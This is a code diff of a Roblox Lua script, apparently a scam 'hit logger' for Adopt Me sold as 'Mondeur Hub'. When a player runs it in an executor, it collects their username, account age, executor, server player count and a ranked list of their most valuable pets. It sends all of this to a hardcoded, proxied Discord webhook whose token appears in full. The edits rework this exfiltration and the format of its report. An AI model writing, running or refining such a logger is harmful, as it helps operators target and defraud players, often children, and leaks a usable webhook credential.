@@ -1,4 +1,4 @@
---// MONDEUR HUB HIT (FULL FIXED)
+--// MONDEUR HUB HIT (V2 FIXED PET LOGGER)
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,13 +9,13 @@ local lp = Players.LocalPlayer
 -- 🔥 PROXY WEBHOOK
 local webhook = "https://webhook.lewisakura.moe/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 
--- executor detection
+-- executor
 local executor =
     (identifyexecutor and identifyexecutor()) or
     (getexecutorname and getexecutorname()) or
     "Unknown"
 
--- request function
+-- request
 local req =
     (syn and syn.request) or
     (http and http.request) or
@@ -27,33 +27,31 @@ if not req then
     return
 end
 
--- =====================
--- 🐶 GET PETS
--- =====================
+-- =========================
+-- 🐶 GET PETS (FIXED)
+-- =========================
 local pets = {}
 
-local success, InventoryDB = pcall(function()
+local success, clientData = pcall(function()
     return require(ReplicatedStorage.ClientModules.Core.ClientData)
 end)
 
-if success and InventoryDB then
-    local data = InventoryDB.get_data()
+if success and clientData then
+    local data = clientData.get_data()[tostring(lp)]
 
-    if data and data.inventory then
-        for _, item in pairs(data.inventory) do
-            if item.category == "pets" then
-                table.insert(pets, {
-                    name = item.id or "Unknown",
-                    rarity = (item.rarity or "common"):lower()
-                })
-            end
+    if data and data.inventory and data.inventory.pets then
+        for _, pet in pairs(data.inventory.pets) do
+            table.insert(pets, {
+                name = pet.id or "Unknown",
+                rarity = (pet.rarity or "common"):lower()
+            })
         end
     end
 end
 
--- =====================
+-- =========================
 -- 💰 TEMP VALUE SYSTEM
--- =====================
+-- =========================
 local rarityValue = {
     legendary = 5,
     ultra_rare = 4,
@@ -70,22 +68,32 @@ table.sort(pets, function(a, b)
     return a.value > b.value
 end)
 
--- =====================
--- 📦 FORMAT PET LIST
--- =====================
+-- =========================
+-- 📦 FORMAT (CLEAN STYLE)
+-- =========================
 local function formatPets(pets)
     local lines = {}
 
     for i, pet in ipairs(pets) do
-        if i > 10 then break end
+        if i > 12 then break end
+
+        local emoji = {
+            legendary = "🟡",
+            ultra_rare = "🟣",
+            rare = "🔵",
+            uncommon = "🟢",
+            common = "⚪"
+        }
+
+        local icon = emoji[pet.rarity] or "❓"
 
         table.insert(lines,
-            string.format("[%d] %s (%s)", i, pet.name, pet.rarity)
+            string.format("%s %s", icon, pet.name)
         )
     end
 
     if #lines == 0 then
-        return "No pets found"
+        return "No pets detected"
     end
 
     return table.concat(lines, "\n")
@@ -93,42 +101,28 @@ end
 
 local petList = formatPets(pets)
 
--- =====================
--- 📊 DATA
--- =====================
+-- =========================
+-- 📊 INFO
+-- =========================
 local playerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers
 
--- =====================
--- 📡 WEBHOOK DATA
--- =====================
+-- =========================
+-- 🌙 CLEAN WEBHOOK DESIGN
+-- =========================
 local data = {
     ["content"] = "",
 
     ["embeds"] = {{
         ["title"] = "🌙 Mondeur Hub Hit",
-        ["color"] = 16753920,
+        ["color"] = 0x2F3136, -- dark clean theme
+
+        ["description"] =
+            "**User:** `" .. lp.Name .. "`\n" ..
+            "**Account Age:** `" .. lp.AccountAge .. " days`\n" ..
+            "**Executor:** `" .. executor .. "`\n" ..
+            "**Players:** `" .. playerCount .. "`",
 
         ["fields"] = {
-            {
-                ["name"] = "👤 Name",
-                ["value"] = "```" .. lp.Name .. "```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "📅 Account Age",
-                ["value"] = "```" .. lp.AccountAge .. " days```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "⚙️ Executor",
-                ["value"] = "```" .. executor .. "```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "👥 Players",
-                ["value"] = "```" .. playerCount .. "```",
-                ["inline"] = true
-            },
             {
                 ["name"] = "🐶 Pets (High → Low)",
                 ["value"] = "```" .. petList .. "```",
@@ -142,16 +136,16 @@ local data = {
         },
 
         ["footer"] = {
-            ["text"] = "Mondeur Hub • Beta"
+            ["text"] = "Mondeur Hub • Adopt Me Logger"
         },
 
         ["timestamp"] = DateTime.now():ToIsoDate()
     }}
 }
 
--- =====================
--- 🚀 SEND WEBHOOK
--- =====================
+-- =========================
+-- 🚀 SEND
+-- =========================
 local successSend, res = pcall(function()
     return req({
         Url = webhook,
